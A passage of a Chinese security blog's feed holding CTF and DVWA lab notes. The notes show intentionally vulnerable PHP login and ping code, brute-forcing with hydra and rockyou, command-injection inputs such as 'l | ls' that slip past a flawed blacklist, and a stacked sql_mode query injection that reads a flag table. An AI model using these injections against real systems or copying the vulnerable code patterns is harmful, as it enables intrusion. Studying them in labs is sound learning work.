class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>针对sql注入起了保护措施，但是sqlmap照样注入了。。。</p>
<p>但是对于爆破并没什么阻碍，和<a href="#low">low</a>一样就行了</p>
<img src="dvwa-brute-force/image-20200721103614652.png" alt="image-20200721103614652" style="zoom:50%;" />



<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>还是可以注入（</p>
<p>步骤都是一样的，但是这次对于字典有一定的要求了</p>
<p>之前我那本字典不够用了，所以就没有爆破出来</p>
<p>使用<code>hydra + rock_you</code>就爆出来了（不过出来了很多）</p>
]]></content>
      <categories>
        <category>web</category>
        <category>dvwa</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title>dvwa-command-injection</title>
    <url>//command-injection.html</url>
    <content><![CDATA[<p>dvwa靶场的命令注入部分</p>
<a id="more"></a>

<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">                                </span><br></pre></td></tr></table></figure>

<p><img src="./dvwa-command-injection/command-injection_low1.png" alt="img"></p>
<p><img src="./dvwa-command-injection/command-injection_low2.png" alt="img"></p>
<p>由于命令执行的时候没有对输入做检测，使用一些特殊的符号可以绕过。<br>最简单的可以使用 <code>; | &amp;&amp; &amp;</code> 绕过。例如输入<code>l | ls</code><br>此时命令会变成 <code>ping l | ls</code>ls指令也会被执行。</p>
<p>注：<code>;``|</code>是Linux终端命令的分隔符</p>
<h2 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">                                </span><br></pre></td></tr></table></figure>

<p>增加了一个操作，过滤了&amp;&amp; 和 ;操作符，但是没有过滤 | 和 &amp;</p>
<p><img src="./dvwa-command-injection/command-injection_middle1.png" alt="img"></p>
<p><img src="./dvwa-command-injection/command-injection_middle2.png" alt="img"></p>
<p>由于过滤并不完全，导致存在漏网之鱼。</p>
<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">                                </span><br></pre></td></tr></table></figure>

<p>完善了黑名单，但是存在一个问题</p>
<p><img src="./dvwa-command-injection/command-injection_high1.png" alt="img"></p>
<p>由于代码写的是 <code>| </code> 而不是 <code>|</code> 所以不加空格就可以绕过</p>
]]></content>
      <categories>
        <category>web</category>
        <category>dvwa</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title>http响应头</title>
    <url>//http_header.html</url>
    <content><![CDATA[<p><strong>HTTP请求报文由3部分组成（请求行+请求头+请求体）</strong></p>
<a id="more"></a>



<p>http请求头包含的内容很多，这里列出比较常用和比较重要的个别</p>
<p>其他的http相应头可以参考<a href="http://tools.jb51.net/table/http_header">相应头和对照表</a></p>
<p><a href="https://blog.csdn.net/weixin_38087538/article/details/82838762">本文参考博文</a></p>
<h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><h3 id="Referer简介"><a href="#Referer简介" class="headerlink" title="Referer简介"></a>Referer简介</h3><p>Referer:表示这个请求是从哪个url跳过来的,通过百度来搜索淘宝网,那么在进入淘宝网的请求报文中,Referer的值就是: <code>www.baidu.com</code>。如果是直接访问就不会有这个头。</p>
<p>从百度访问某个网站：</p>
<img src="http_header/image-20200721143939974.png" alt="image-20200721143939974" style="zoom:67%;" />



<h3 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h3><p>在服务器端验证<code>Referer</code>字段，以确定使用者是否通过正常途径访问。</p>
<p>比如需要访问 <code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>，用户必须先登陆 <code>bank.example</code>，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 <code>bank.example</code> 域名开头的地址。</p>
<p>而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向<strong>黑客自己的网站</strong>。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 <code>bank.example</code> 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ol>
<li> 抓包修改</li>
<li> 如果是生活当中可以在把文件放在本机上命名为<code>[server_name].html</code>，然后跳转到目标页面，那时的referer应该是<code>http://本机IP/服务器IP.txt</code>，利用文件名也可以绕过。</li>
</ol>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p><a href="https://www.cnblogs.com/magicg/p/12870215.html">关于Cookie和CSRF、XSS可以看这篇</a></p>
<h3 id="Cookie简介"><a href="#Cookie简介" class="headerlink" title="Cookie简介"></a>Cookie简介</h3><p><a href="https://www.cnblogs.com/fnng/archive/2012/08/14/2637279.html">Cookie</a>，是用于保存相关信息，指示 你是谁 作用的（？）</p>
<p>平时登录某网站之后，一段时间内访问不需要登录就是因为Cookie</p>
<p>服务器通过在HTTP的响应头中加上一行特殊的指示以提示<strong>浏览器按照指示生成相应的cookie</strong>。然而纯粹的客户端脚本如<code>JavaScript</code>或者<code>VBScript</code>也可以生成cookie。而cookie的使用是由浏览器按照一定的原则在后台自动发送给服务器的。</p>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>由于Cookie可以用来绕过登录、欺骗服务器，所以可以被用于CSRF攻击。</p>
<p>解决方法：使用 <code>Token</code> 替代 <code>Cookie</code>等。</p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>由于Cookie存放在本地，且<code>JavaScript</code>可以轻易的获取(例如使用<code>document.cookie</code>等)，跨站脚本可以获取到Cookie信息。</p>
<h2 id="host"><a href="#host" class="headerlink" title="host"></a>host</h2><p>指定服务器的域名和端口号</p>
<h2 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h2><p><a href="https://tool.oschina.net/commons/">对照表</a></p>
<p><code>Content-Type</code>是Http的实体首部字段，在<strong>request的请求行（或response的状态码）之后</strong>。用于说明请求或返回的消息主体是用何种方式编码，在<code>request header</code>和<code>response header</code>里都存在。</p>
<h3 id="uploads"><a href="#uploads" class="headerlink" title="uploads"></a>uploads</h3><p>文件上传可能会检查对应的<code>Content-Type</code>来确定上传文件的类型，防止木马上传。</p>
<p>例如dvwa的uploads(middle)题</p>
<hr>
<p>还有啥想到再写</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>sql_mode介绍</title>
    <url>//sql_mode.html</url>
    <content><![CDATA[<p><code>sql_mode</code>：定义了<code>sql</code>的约束规则？（大概）</p>
<a id="more"></a>



<h1 id="sql-mode"><a href="#sql-mode" class="headerlink" title="sql_mode"></a>sql_mode</h1><p>在buu刷题的时候，某道sql注入题使用了<code>sql_mode=pipes_as_concat</code>，不解，于是查找资料，学习<code>sql_mode</code></p>
<h2 id="查看现在使用的sql-mode"><a href="#查看现在使用的sql-mode" class="headerlink" title="查看现在使用的sql_mode"></a>查看现在使用的sql_mode</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select @@sql_mode;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922191341938.png" alt="image-20200922191341938"></p>
<p>其中值表示啥下面会讲</p>
<h2 id="sql-mode-值的意义"><a href="#sql-mode-值的意义" class="headerlink" title="sql_mode 值的意义"></a>sql_mode 值的意义</h2><h3 id="ONLY-FULL-GROUP-BY"><a href="#ONLY-FULL-GROUP-BY" class="headerlink" title="ONLY_FULL_GROUP_BY"></a>ONLY_FULL_GROUP_BY</h3><h4 id="解释？"><a href="#解释？" class="headerlink" title="解释？"></a>解释？</h4><p>对于<code>GROUP BY</code>聚合操作，如果在SELECT中的列，<strong>没有在<code>GROUP BY</code>中出现</strong>，那么将认为这个SQL是不合法的，因为列不在<code>GROUP BY</code>从句中</p>
<h4 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h4><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922192455629.png" alt="image-20200922192455629" style="zoom:50%;" />

<p>开启了**<code>ONLY_FULL_GROUP_BY</code>**</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922192059464.png" alt="image-20200922192059464"></p>
<p>出现了报错，因为<code>id</code>和<code>password</code>字段<strong>并不在<code>group by list</code>（group by 后面跟的字段）中</strong>，如果<code>select list</code>和<code>group by list</code>相同，则不会报错</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922192830898.png" alt="image-20200922192830898"></p>
<h3 id="STRICT-TRANS-TABLES-amp-amp-STRICT-ALL-TABLES"><a href="#STRICT-TRANS-TABLES-amp-amp-STRICT-ALL-TABLES" class="headerlink" title="STRICT_TRANS_TABLES &amp;&amp; STRICT_ALL_TABLES"></a>STRICT_TRANS_TABLES &amp;&amp; STRICT_ALL_TABLES</h3><h4 id="解释？-1"><a href="#解释？-1" class="headerlink" title="解释？"></a>解释？</h4><p>严格模式：</p>
<blockquote>
<p>在此模式下，一旦任何操作的数据产生问题，都将终止当前的操作，对于启用STRICT_ALL_TABLES的非事务引擎而言，这时数据可能停留在一个未知的状态，因此需非常小心这个选项可能带来的潜在影响。</p>
</blockquote>
<p><strong>STRICT_TRANS_TALES（严格模式）：</strong><br>只对支持事务的表启用严格模式</p>
<p><strong>STRICT_ALL_TABLES（严格模式）：</strong><br>对所有引擎的表都启用严格模式</p>
<h4 id="举例：-1"><a href="#举例：-1" class="headerlink" title="举例："></a>举例：</h4><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922193512075.png" alt="image-20200922193512075" style="zoom:50%;" />

<p>开启了<code>strict_all_tables</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922194001026.png" alt="image-20200922194001026"></p>
<p>可以看到当数据类型不匹配的时候插入不了（上面的红色框框）</p>
<p>去除这个<code>sql_mode</code>的时候就可以插入，(会进行类型转换)</p>
<h3 id="NO-ZERO-IN-DATE-amp-amp-NO-ZERO-DATE"><a href="#NO-ZERO-IN-DATE-amp-amp-NO-ZERO-DATE" class="headerlink" title="NO_ZERO_IN_DATE &amp;&amp; NO_ZERO_DATE"></a>NO_ZERO_IN_DATE &amp;&amp; NO_ZERO_DATE</h3><h4 id="解释？-2"><a href="#解释？-2" class="headerlink" title="解释？"></a>解释？</h4><ul>
<li><p><strong><code>NO_ZERO_IN_DATE</code></strong></p>
<p>  在严格模式，<strong>不接受月或日部分为<code>0</code>的日期</strong>。如果使用<code>IGNORE</code>选项，我们为类似的日期插入**<code>&#39;0000-00-00&#39;</code>**。在非严格模式，可以接受该日期，但会生成警告。</p>
</li>
<li><p><strong><code>NO_ZERO_DATE</code></strong></p>
<p>  在严格模式，<strong>不要将<code> &#39;0000-00-00&#39;</code>做为合法日期</strong>。你仍然可以用IGNORE选项插入零日期。在非严格模式，可以接受该日期，但会生成警告</p>
</li>
</ul>
<h4 id="举例：-2"><a href="#举例：-2" class="headerlink" title="举例："></a>举例：</h4><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922194333853.png" alt="image-20200922194333853" style="zoom:50%;" />

<p>没有加入**<code>NO_ZERO_IN_DATE</code>**</p>
<p>顺利的插入了<code>0000-00-00</code>作为值</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922195014020.png" alt="image-20200922195014020"></p>
<p><code>1000-00-00</code>也顺利写入<img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922195031997.png"></p>
<p>修改<code>sql_mode</code>，加入<code>NO_ZERO_IN_DATE</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922195242239.png" alt="image-20200922195242239"></p>
<p>无法插入数据</p>
<h3 id="ERROR-FOR-DIVISION-BY-ZERO"><a href="#ERROR-FOR-DIVISION-BY-ZERO" class="headerlink" title="ERROR_FOR_DIVISION_BY_ZERO"></a>ERROR_FOR_DIVISION_BY_ZERO</h3><h4 id="解释？-3"><a href="#解释？-3" class="headerlink" title="解释？"></a>解释？</h4><p>看名字就知道了（大概）</p>
<p>在严格模式，在<code>INSERT</code>或<code>UPDATE</code>过程中，**如果被零除(或MOD(X，0))，则产生错误(否则为警告)**。如果未给出该模式，被零除时MySQL返回NULL。如果用到<code>INSERT IGNORE</code>或<code>UPDATE IGNORE</code>中，MySQL生成被零除警告，但操作结果为NULL。</p>
<h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922200504284.png" alt="image-20200922200504284" style="zoom:50%;" />

<p>没有开启<code>ERROR_FOR_DIVISION_BY_ZERO</code></p>
<p>尝试插入数据</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922200707483.png" alt="image-20200922200707483"></p>
<p>没有报错，只是变成了<code>NULL</code></p>
<p>开启<code>ERROR_FOR_DIVISION_BY_ZERO</code></p>
<img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922200852189.png" alt="image-20200922200852189" style="zoom:50%;" />

<p>插入 除0的数据</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922200955449.png" alt="image-20200922200955449"></p>
<p>报错了</p>
<h3 id="NO-AUTO-CREATE-USER"><a href="#NO-AUTO-CREATE-USER" class="headerlink" title="NO_AUTO_CREATE_USER"></a>NO_AUTO_CREATE_USER</h3><h4 id="解释？-4"><a href="#解释？-4" class="headerlink" title="解释？"></a>解释？</h4><p><strong>防止GRANT自动创建新用户</strong>，除非还指定了密码。</p>
<blockquote>
<p>mysql8.0以前的版本可以使用grant在授权的时候隐式的创建用户，8.0以后已经不支持，所以必须先创建用户，然后再授权</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; CREATE USER &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;Hadoop3!&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.04 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; grant all privileges on *.* to &#39;root&#39;@&#39;%&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.03 sec)</span><br></pre></td></tr></table></figure>



<h3 id="PIPES-AS-CONCAT"><a href="#PIPES-AS-CONCAT" class="headerlink" title="PIPES_AS_CONCAT"></a>PIPES_AS_CONCAT</h3><h4 id="解释？-5"><a href="#解释？-5" class="headerlink" title="解释？"></a>解释？</h4><p>将<code>&quot;||&quot;</code>视为字符串的连接操作符而非或运算符，这和<code>Oracle</code>数据库是一样是，也和字符串的拼接函数<code>concat</code>相类似</p>
<h4 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h4><p>没有开启<code>pipes_as_concat</code></p>
<img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922201755325.png" alt="image-20200922201755325" style="zoom:50%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1||id from users;</span><br></pre></td></tr></table></figure>

<img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922201844660.png" alt="image-20200922201844660" style="zoom:50%;" />

<p>搜索的数据全是<code>1</code>（1||id）</p>
<p>开启之后</p>
<img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922201954474.png" alt="image-20200922201954474" style="zoom:50%;" />

<p>结果由<code>1</code>和<code>id</code>拼接而成</p>
<img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200922202112951.png" alt="image-20200922202112951" style="zoom:50%;" />

<p>所以可以通过这个参数，控制<code>||</code>实现注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select $_GET[&#39;code&#39;] || Flag from flag;</span><br></pre></td></tr></table></figure>

<p>当<code>code=1;set sql_mode=pipes_as_concat; select 1</code>的时候，sql语句被拼接成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1;set sql_mode&#x3D;pipes_as_concat; select 1 || Flag from flag;</span><br></pre></td></tr></table></figure>

<p>根据上面的例子可得，会输出<code>1</code>和<code>Flag</code>字段内容拼接后的结果</p>
<h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2><p>主要是我懒（</p>
